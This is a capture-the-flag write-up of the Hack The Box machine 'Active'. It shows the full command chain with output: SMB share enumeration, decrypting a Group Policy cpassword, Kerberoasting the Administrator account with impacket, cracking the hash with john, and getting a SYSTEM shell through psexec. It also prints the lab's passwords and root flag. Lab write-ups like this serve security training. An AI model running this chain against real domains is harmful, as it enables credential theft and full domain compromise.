---
description: >-
  Active is an easy to medium difficulty machine, which features two very
  prevalent techniques to gain privileges within an Active Directory
  environment.
---

# Active

## Information

| Name            |                ![](<../../../.gitbook/assets/image (30).png>) |
| --------------- | ------------------------------------------------------------: |
| OS              |                                                       Windows |
| Difficulty      |                                                          Easy |
| Vulnerabilities | Default Credentials, Weak Permissions, Anonymous/Guest Access |

<img src="../../../.gitbook/assets/file.excalidraw (2).svg" alt="" class="gitbook-drawing">

## Enumeration

### Nmap

```apacheconf
msplmee@kali:~$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.032s latency).
Scanned at 2023-08-14 03:01:44 EDT for 107s
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped    syn-ack
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  tcpwrapped    syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-14T07:03:28
|_  start_date: 2023-08-13T23:22:45
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56269/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28090/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 2s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 14 03:03:31 2023 -- 1 IP address (1 host up) scanned in 108.89 seconds
```

A number of ports are open. The machine is domain controller.&#x20;

Add domain `active.htb` to `/etc/hosts`

```
echo '10.10.10.100 active.htb' | sudo tee -a /etc/hosts
```

#### SMB - TCP 139/445 <a href="#smb---tcp-139445" id="smb---tcp-139445"></a>

`smbmap` clearly shows that I can access the `Replication` share without authentication.

```
msplmee@kali:~$ smbmap -H 10.10.10.100     
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

## User

### Replication share

I use `smbmap` with the `--depth` option to show all `Replication` share files.

```apacheconf
msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10 
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Replication                                             READ ONLY
        .\Replication\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
        .\Replication\active.htb\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
        .\Replication\active.htb\DfsrPrivate\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
        .\Replication\active.htb\Policies\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 06:38:11 2018    GptTmpl.inf
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 06:38:11 2018    Groups.xml
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 06:38:11 2018    GptTmpl.inf
```

I see an interesting file named `Groups.xml`:

```apacheconf
msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10 -A Groups.xml
[+] IP: 10.10.10.100:445        Name: active.htb                                        
[+] Starting search for files matching 'Groups.xml' on share Replication.
[+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml<?xml version="1.0" encoding="utf-8"?>
```

It has `userName` and `cpassword` fields:

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
{% endcode %}

I have the key, so I can use it to unlock the password with `gpp-decrypt`.

```apacheconf
msplmee@kali:~$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### Users share

With valid credentials, I can access the SYSVOL and Users shares

```apacheconf
msplmee@kali:~$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

When I access the Users share, it appears as the C:\users\ folder

```apacheconf
msplmee@kali:~$ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 274582 blocks available
smb: \> cd SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

I get user.txt:

```apacheconf
msplmee@kali:~$ cat user.txt                                                                                                                   
d46*****************************
```

## Root

I use `impacket-GetADUsers` to display a list of domain user accounts.

```apacheconf
msplmee@kali:~$ impacket-GetADUsers -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2023-08-13 19:23:54.702555 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277
```

### Kerberoasting <a href="#kerberoasting" id="kerberoasting"></a>

I use the `impacket-GetUserSPNs` to get a list of service usernames linked to regular user accounts and a ticket that I can try to crack.

```apacheconf
msplmee@kali:~/HTB/Machine/Active$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save -outputfile GetUserSPNs.out
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-08-13 19:23:54.702555             

[-] CCache file is not found. Skipping...
```

It provides me with the ticket

```apacheconf
msplmee@kali:~$ cat GetUserSPNs.out 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08f8f3f260e1925899cdbc3a0cbecd34$0827c37a1febb71918dbf2741e7adaa33247a4d317a21e30b49c3b14a08775446b343c966ac36a8a255b4669055fd9119d1047f628db51c8641713fae0aa32aca9d192537f60ece4002d6236151b82bcbe66a3dd505b23fc11af32d6139d73eab0bbcacca811ca362dcca29c3f5537bb9f3a61f5f12aca0131199af2f5e48d226228fb5315f1e67276ddc71ab03221b7d72a6e3f919d5eeee784a7bf19b7b49899731f031340353aeee096c8c0b4eebcc4d3237e3e5c13f5fa726d6966c56884badbf4b43872c1053a029c8ee2e94031fbf9d7697d2766bdb807d6c83fad6a3937d8d230fd43a74d45d3f1fcbe7c557aa2bd57fc6dd351cb402cb502a1a173fd2bacb4fafc88e86dbe4c1b7d713e9c24fcd18ea46fbd967772c1cd48741ca6383365eada9e1eff7feed724c3b7ae9d45656c1db9074067c9693b27634f0dbeb4d6243bc257969c2424291fc918588a5c03a90ac8d0641870711f3f6298ad083a0081e9d1b408a34359d8dd6d64d1702101f85666cfae4664db8e83ae4d16004b3eed43e9c34c793270ab79ad745f33eb2d288d6a1247802ab5af3e6e86b600835f49e89e398cdee95f2cbfa3aeae117d994070f5dc96974863f070099825746630725768d2f9d958e687e511c3673f4a313021c0edeb4aa6ecdc42f8d0d90f963f54d20b672140c12c60ffdf2993b3a7ab51c3a7ac62d1511a6e856017b940f4a3c810702bde6568bc779070385742c281e50c25b919e3f4f01c7fe69b205af6af59c22699a2b16d2b8ff3ccb8d1bf116816ba6ab502bef44e20446af1d87b52d419acd8897dc838b9b98aaa7664d6d05554a7128feaae1631c803418788c9bcddc7e1e24a0e5238dc0783146017c770efdd65608330565c4402c09a03037f221e9176f4ee629ad2a950d4b0a377b79f0eb508338026d775bd95b65e094c10e7fe8efd6f3c83cf254befcee0755c80c895be050f168670bbfd85c5daf8805bf89a20305981864bdef2cf6579cfcf71f61b816ed2721206b2ced2cc5b5a59a6a2e59c2b36df8c754112278b589ca68f1c816acb1510f70cce9611dea371277b8bd79084b58e000038842ec7665ff5415a6db4de7db722fe56237fc77d103885f220e90f8909d8b9263a7d9c9a7bf1bf2916179760644e375c1a7a87281b469a57556a64333ec4a5640ffdf17cf81d2330c96c36592d57643c52915de8dd2a86b4895a67cc3e7de3be7c3f8a7c48c1d9282150db94cba02e42ff62
```

The hash cracks easily with `john`

```apacheconf
msplmee@kali:~$ john GetUserSPNs.out -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:07 DONE (2023-08-14 04:55) 0.1333g/s 1405Kp/s 1405Kc/s 1405KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Shell

I use `impacket-psexec` to get a shell.

```apacheconf
msplmee@kali:~$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100 
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file lnycwIhI.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service zSfU on 10.10.10.100.....
[*] Starting service zSfU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

I get root.txt&#x20;

```sh
C:\Users\Administrator\Desktop> more root.txt
e5bfca10111bfc0f75a1be213d8324f2
```
